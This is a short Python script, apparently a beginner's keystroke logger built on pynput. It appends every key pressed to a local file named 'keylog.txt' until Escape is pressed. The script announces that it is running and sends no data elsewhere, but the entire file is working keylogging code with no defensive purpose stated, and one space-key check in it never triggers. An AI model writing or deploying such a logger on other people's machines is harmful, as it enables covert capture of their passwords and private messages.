from pynput import keyboard

key = 0

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f' {key} ')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def listener(key):
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        if key == keyboard.Key.space:
            print(" ")
        print("Keystroke logger is running. Press 'Escape' to stop.")
        listener.join()

listener(key)